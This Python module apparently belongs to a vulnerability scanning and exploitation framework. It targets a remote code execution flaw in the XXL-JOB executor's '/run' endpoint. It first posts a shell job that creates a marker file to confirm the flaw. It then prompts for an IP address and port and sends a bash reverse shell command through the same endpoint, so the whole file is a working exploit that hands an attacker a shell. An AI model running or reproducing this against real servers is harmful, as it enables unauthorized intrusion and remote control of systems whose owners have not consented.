#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
import requests
class XXL_JOB_Wsq_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        if not self.batch:
            OutPrintInfo("XXL-JOB", "开始检测XXL-JOB-Wsq-Rce...")
        url2 = url + '/run'
        header = {
            "Host": url.split("://")[-1],
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": self.header,
            "Content-Type": "application/json"
        }
        data = {
              "jobId": 1,
              "executorHandler": "demoJobHandler",
              "executorParams": "demoJobHandler",
              "executorBlockStrategy": "COVER_EARLY",
              "executorTimeout": 0,
              "logId": 1,
              "logDateTime": 1586629003729,
              "glueType": "GLUE_SHELL",
              "glueSource": "touch /tmp/awesomecs",
              "glueUpdatetime": 1586699003758,
              "broadcastIndex": 0,
              "broadcastTotal": 0
            }
        try:
            req = requests.post(url2, timeout=3,json=data,verify=self.verify,proxies=self.proxy,headers=header)
            if "code" in req.text and "200" in req.text and req.status_code == 200:
                OutPrintInfoSuc("XXL-JOB", f"存在XXL-JOB-Wsq-Rce {url2}")
                if self.batch:
                    with open("./result/xxl_job_wsq_rce.txt","a") as w:
                        w.write(f"{url2}\n")

            return True
        except:
            if not self.batch:
                OutPrintInfo("XXL-JOB", "不存在XXL-JOB-Wsq-Rce")
            return False
    def send_payload2(self,url,ip,port):
        OutPrintInfo("XXL-JOB", "开始执行反弹shell...")
        url2 = url + '/run'
        header = {
            "Host": url.split("://")[-1],
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": self.header,
            "Content-Type": "application/json"
        }
        data = {
              "jobId": 1,
              "executorHandler": "demoJobHandler",
              "executorParams": "demoJobHandler",
              "executorBlockStrategy": "COVER_EARLY",
              "executorTimeout": 0,
              "logId": 1,
              "logDateTime": 1586629003729,
              "glueType": "GLUE_SHELL",
              "glueSource": f"bash -i >& /dev/tcp/{ip.strip()}/{str(port).strip()} 0>&1 ",
              "glueUpdatetime": 1586699003758,
              "broadcastIndex": 0,
              "broadcastTotal": 0
            }
        try:
            req = requests.post(url2, timeout=3,json=data,verify=self.verify,proxies=self.proxy,headers=header)
            if "code" in req.text and "200" in req.text and req.status_code == 200:
                OutPrintInfoSuc("XXL-JOB", f"反弹shell成功")
            return True
        except:
            OutPrintInfo("XXL-JOB", "反弹shell执行结束")
            return False

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        proxy = target["proxy"]
        self.header = target["header"]
        self.verify = target["ssl"]

        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if self.send_payload(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否进行RCE利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    ip = Prompt.ask("[b yellow]输入转发IP")
                    port = Prompt.ask("[b yellow]输入转发Port")

                    self.send_payload2(url, ip,port)

                else:
                    return
